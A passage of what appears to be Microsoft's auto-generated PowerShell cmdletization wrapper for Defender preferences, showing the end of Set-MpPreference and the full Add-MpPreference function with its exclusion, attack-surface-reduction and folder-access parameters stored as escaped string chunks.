[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NetworkProtectionReputationMode'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NetworkProtectionReputationMode'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('IntelTDTEnabled')) {\r\n          [object]$__cmdletization_value = ${IntelTDTEnabled}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IntelTDTEnabled'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IntelTDTEnabled'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_RuleSpecificExclusions_Id')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_RuleSpecificExclusions_Id}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions_Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions_Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_RuleSpecificExclusions')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_RuleSpecificExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('OobeEnableRtpAndSigUpdate')) {\r\n          [object]$__cmdletization_value = ${OobeEnableRtpAndSigUpdate}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'OobeEnableRtpAndSigUpdate'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'OobeEnableRtpAndSigUpdate'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('PerformanceModeStatus')) {\r\n          [object]$__cmdletization_value = ${PerformanceModeStatus}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PerformanceModeStatus'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PerformanceModeStatusType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PerformanceModeStatus'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PerformanceModeStatusType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('QuickScanIncludeExclusions')) {\r\n          [object]$__cmdletization_value = ${QuickScanIncludeExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuickScanIncludeExclusions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.QuickScanIncludeExclusionsType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuickScanIncludeExclusions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.QuickScanIncludeExclusionsType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableCacheMaintenance')) {\r\n          [object]$__cmdletization_value = ${DisableCacheMaintenance}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCacheMaintenance'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCacheMaintenance'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoveScanningThreadPoolCap')) {\r\n          [object]$__cmdletization_value = ${RemoveScanningThreadPoolCap}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoveScanningThreadPoolCap'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoveScanningThreadPoolCap'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Set', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERN"
"ALHELP MSFT_MpPreference.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Set-MpPreference' -Alias '*'\r\n        \r\n\r\nfunction Add-MpPreference\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionPath},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionExtension},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionProcess},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionIpAddress},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [Alias('tiddefaci')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [long[]]\r\n    ${ThreatIDDefaultAction_Ids},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [Alias('tiddefaca')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]]\r\n    ${ThreatIDDefaultAction_Actions},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${AttackSurfaceReductionOnlyExclusions},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ControlledFolderAccessAllowedApplications},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ControlledFolderAccessProtectedFolders},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${AttackSurfaceReductionRules_Ids},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]]\r\n    ${AttackSurfaceReductionRules_Actions},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${AttackSurfaceReductionRules_RuleSpecificExclusions_Id},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${AttackSurfaceReductionRules_RuleSpecificExclusions},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [Alias('repe')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${RemoteEncryptionProtectionExclusions},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [Alias('bfpe')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${BruteForceProtectionExclusions},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [switch]\r\n    ${Force},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Add1')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionPath')) {\r\n          [object]$__cmdletization_value = ${ExclusionPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionExtension')) {\r\n          [object]$__cmdletization_value = ${ExclusionExtension}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionProcess')) {\r\n          [object]$__cmdletization_value = ${ExclusionProcess}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionIpAddress')) {\r\n          [object]$__cmdletization_value = ${ExclusionIpAddress}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Ids')) {\r\n          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Ids}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Actions')) {\r\n          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Actions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionOnlyExclusions')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionOnlyExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessAllowedApplications')) {\r\n          [object]$__cmdletization_value = ${"
"ControlledFolderAccessAllowedApplications}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessProtectedFolders')) {\r\n          [object]$__cmdletization_value = ${ControlledFolderAccessProtectedFolders}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Ids')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Ids}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Actions')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Actions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_RuleSpecificExclusions_Id')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_RuleSpecificExclusions_Id}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions_Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions_Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_RuleSpecificExclusions')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_RuleSpecificExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoteEncryptionProtectionExclusions')) {\r\n          [object]$__cmdletization_value = ${RemoteEncryptionProtectionExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('BruteForceProtectionExclusions')) {\r\n          [object]$__cmdletization_value = ${BruteForceProtectionExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Force')) {\r\n          [object]$__cmdletization_value = ${Force}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Add', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 